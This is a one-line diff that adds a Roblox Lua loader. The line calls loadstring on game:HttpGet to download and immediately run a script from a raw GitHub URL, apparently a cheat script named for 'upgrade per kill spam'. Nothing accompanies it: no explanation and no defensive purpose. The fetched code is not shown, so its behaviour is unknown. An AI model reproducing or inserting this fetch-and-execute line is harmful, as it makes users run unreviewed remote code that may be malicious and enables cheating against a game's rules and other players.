@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/1-upgrade-per-kill-spam7-3bcy872yn629h3.lua"))()
